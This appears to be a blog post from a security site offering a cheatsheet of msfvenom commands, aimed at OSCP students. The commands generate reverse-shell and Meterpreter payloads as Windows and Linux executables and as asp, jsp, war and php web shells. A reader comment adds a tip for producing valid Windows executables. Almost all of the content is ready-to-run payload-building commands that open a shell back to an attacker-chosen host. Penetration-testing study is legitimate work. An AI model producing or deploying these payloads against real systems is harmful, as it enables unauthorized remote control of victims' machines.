# https://infinitelogins.com/2020/01/25/msfvenom-reverse-shell-payload-cheatsheet/

[Skip to content](https://infinitelogins.com/2020/01/25/msfvenom-reverse-shell-payload-cheatsheet/#content)

Primary Menu

# [Infinite Logins](https://infinitelogins.com/)

[Skip to content](https://infinitelogins.com/2020/01/25/msfvenom-reverse-shell-payload-cheatsheet/#content)

Encrypt and Anonymize Your Internet Connection for as Little as $3/mo with PIA VPN. [Learn](https://www.privateinternetaccess.com/pages/buy-vpn/infinitelogins-00001) [M](https://www.privateinternetaccess.com/pages/buy-vpn/infinitelogins-00001) [ore](https://www.privateinternetaccess.com/pages/buy-vpn/infinitelogins-00001)

There are tons of cheatsheets out there, but I couldn’t find a comprehensive one that includes non-Meterpreter shells. I will include both Meterpreter, as well as non-Meterpreter shells for those studying for OSCP.

Table of Contents:

– Non Meterpreter Binaries

– Non Meterpreter Web Payloads

– Meterpreter Binaries

– Meterpreter Web Payloads

* * *

## Non-Meterpreter Binaries

Staged Payloads for Windows

|     |     |
| --- | --- |
| x86 | `msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x86.exe` |
| x64 | `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x64.exe` |

Stageless Payloads for Windows

|     |     |
| --- | --- |
| x86 | `msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x86.exe` |
| x64 | `msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x64.exe` |

Staged Payloads for Linux

|     |     |
| --- | --- |
| x86 | `msfvenom -p linux/x86/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x86.elf` |
| x64 | `msfvenom -p linux/x64/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x64.elf` |

Stageless Payloads for Linux

|     |     |
| --- | --- |
| x86 | `msfvenom -p linux/x86/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x86.elf` |
| x64 | `msfvenom -p linux/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x64.elf` |

* * *

## Non-Meterpreter Web Payloads

|     |     |
| --- | --- |
| asp | `msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f asp > shell.asp` |
| jsp | `msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.jsp` |
| war | `msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f war > shell.war` |
| php | `msfvenom -p php/reverse_php LHOST=<IP> LPORT=<PORT> -f raw > shell.php` |

* * *

## Meterpreter Binaries

Staged Payloads for Windows

|     |     |
| --- | --- |
| x86 | `msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x86.exe` |
| x64 | `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x64.exe` |

Stageless Payloads for Windows

|     |     |
| --- | --- |
| x86 | `msfvenom -p windows/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x86.exe` |
| x64 | `msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x64.exe` |

Staged Payloads for Linux

|     |     |
| --- | --- |
| x86 | `msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x86.elf` |
| x64 | `msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x64.elf` |

Stageless Payloads for Linux

|     |     |
| --- | --- |
| x86 | `msfvenom -p linux/x86/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x86.elf` |
| x64 | `msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x64.elf` |

* * *

## Meterpreter Web Payloads

|     |     |
| --- | --- |
| asp | `msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f asp > shell.asp` |
| jsp | `msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > example.jsp` |
| war | `msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f war > example.war` |
| php | `msfvenom -p php/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.php` |

- [Twitter](https://twitter.com/infinitelogins)
- [YouTube](https://www.youtube.com/channel/UC_nKukFaGysjMzqMVHEIgxQ)

Donations and Support:

Like my content? Please consider supporting me on Patreon:

[https://www.patreon.com/infinitelogins](https://www.patreon.com/infinitelogins)

Purchase a VPN Using my Affiliate Link

[https://www.privateinternetaccess.com/pages/buy-vpn/infinitelogins](https://www.privateinternetaccess.com/pages/buy-vpn/infinitelogins)

👇 SUBSCRIBE TO INFINITELOGINS YOUTUBE CHANNEL NOW 👇

[https://www.youtube.com/c/infinitelogins?sub\_confirmation=1](https://www.youtube.com/c/infinitelogins?sub_confirmation=1)

### Share this:

- [Share on X (Opens in new window)X](https://infinitelogins.com/2020/01/25/msfvenom-reverse-shell-payload-cheatsheet/?share=twitter&nb=1)
- [Share on Facebook (Opens in new window)Facebook](https://infinitelogins.com/2020/01/25/msfvenom-reverse-shell-payload-cheatsheet/?share=facebook&nb=1)

LikeLoading...

[Reblog](https://widgets.wp.com/likes/index.html?ver=20260218# "Reblog this post on your main site.")

[Like](https://widgets.wp.com/likes/index.html?ver=20260218# "Be the first to like this.")

Be the first to like this.

### _Related_

[Using Unicorn.py to Automate PowerShell Meterpeter Shells](https://infinitelogins.com/2020/09/05/using-unicorn-py-to-automate-powershell-meterpeter-shells/ "Using Unicorn.py to Automate PowerShell Meterpeter&nbsp;Shells")September 5, 2020In "Tips & Tricks"

[Pivoting to Attack Remote Networks Through Meterpreter Sessions and Proxychains](https://infinitelogins.com/2021/02/20/using-metasploit-routing-and-proxychains-for-pivoting/ "Pivoting to Attack Remote Networks Through Meterpreter Sessions and&nbsp;Proxychains")February 20, 2021In "Tips & Tricks"

[Windows Privilege Escalation: Abusing SeImpersonatePrivilege with Juicy Potato](https://infinitelogins.com/2020/12/09/windows-privilege-escalation-abusing-seimpersonateprivilege-juicy-potato/ "Windows Privilege Escalation: Abusing SeImpersonatePrivilege with Juicy&nbsp;Potato")December 9, 2020In "Hacking Tutorial"

## 4 thoughts on “MSFVenom Reverse Shell Payload Cheatsheet (with & without Meterpreter)”

1. Pingback: [Hack the Box Write-Up: NINEVAH (Without Metasploit) \| Infinite Logins](https://infinitelogins.com/2020/04/13/hack-the-box-write-up-ninevah-without-metasploit/)

2. Pingback: [Abusing Local Privilege Escalation Vulnerability in Liongard ROAR <1.9.76 \| Infinite Logins](https://infinitelogins.com/2020/05/18/abusing-local-privilege-escalation-vulnerability-in-liongard-roar/)

3. Pingback: [Writeup – CSL – Boats – Actual Tom](https://actualtom.com/writeup-csl-boats/)

4. PSA: run these commands via cmd.exe, not in Powershell. Powershell output seems to do some sort of encoding that will generate an invalid PE file when you redirect the output to file, but running these under cmd.exe works correctly.



(Windows 10 1809)



[Like](https://infinitelogins.com/2020/01/25/msfvenom-reverse-shell-payload-cheatsheet/?like_comment=417&_wpnonce=35cf4d365e) Like





[Reply](https://infinitelogins.com/2020/01/25/msfvenom-reverse-shell-payload-cheatsheet/?replytocom=417#respond)


### Leave a comment [Cancel reply](https://infinitelogins.com/2020/01/25/msfvenom-reverse-shell-payload-cheatsheet/\#respond "Cancel reply")

Δ

- [Comment](https://infinitelogins.com/2020/01/25/msfvenom-reverse-shell-payload-cheatsheet/#comments)
- [Reblog](https://infinitelogins.com/2020/01/25/msfvenom-reverse-shell-payload-cheatsheet/)
- [Subscribe](https://infinitelogins.com/2020/01/25/msfvenom-reverse-shell-payload-cheatsheet/) [Subscribed](https://infinitelogins.com/2020/01/25/msfvenom-reverse-shell-payload-cheatsheet/)








  - [![](https://infinitelogins.com/wp-content/uploads/2020/05/cropped-1-official-finished-transparent-modified.png?w=50) Infinite Logins](https://infinitelogins.com/)

Join 79 other subscribers

Sign me up

  - Already have a WordPress.com account? [Log in now.](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Fr-login.wordpress.com%2Fremote-login.php%3Faction%3Dlink%26back%3Dhttps%253A%252F%252Finfinitelogins.com%252F2020%252F01%252F25%252Fmsfvenom-reverse-shell-payload-cheatsheet%252F)


- - [![](https://infinitelogins.com/wp-content/uploads/2020/05/cropped-1-official-finished-transparent-modified.png?w=50) Infinite Logins](https://infinitelogins.com/)
  - [Subscribe](https://infinitelogins.com/2020/01/25/msfvenom-reverse-shell-payload-cheatsheet/) [Subscribed](https://infinitelogins.com/2020/01/25/msfvenom-reverse-shell-payload-cheatsheet/)
  - [Sign up](https://wordpress.com/start/)
  - [Log in](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Fr-login.wordpress.com%2Fremote-login.php%3Faction%3Dlink%26back%3Dhttps%253A%252F%252Finfinitelogins.com%252F2020%252F01%252F25%252Fmsfvenom-reverse-shell-payload-cheatsheet%252F)
  - [Copy shortlink](https://wp.me/pbzRMW-51)
  - [Report this content](https://wordpress.com/abuse/?report_url=https://infinitelogins.com/2020/01/25/msfvenom-reverse-shell-payload-cheatsheet/)
  - [View post in Reader](https://wordpress.com/reader/blogs/171087942/posts/311)
  - [Manage subscriptions](https://subscribe.wordpress.com/)
  - [Collapse this bar](https://infinitelogins.com/2020/01/25/msfvenom-reverse-shell-payload-cheatsheet/)

%d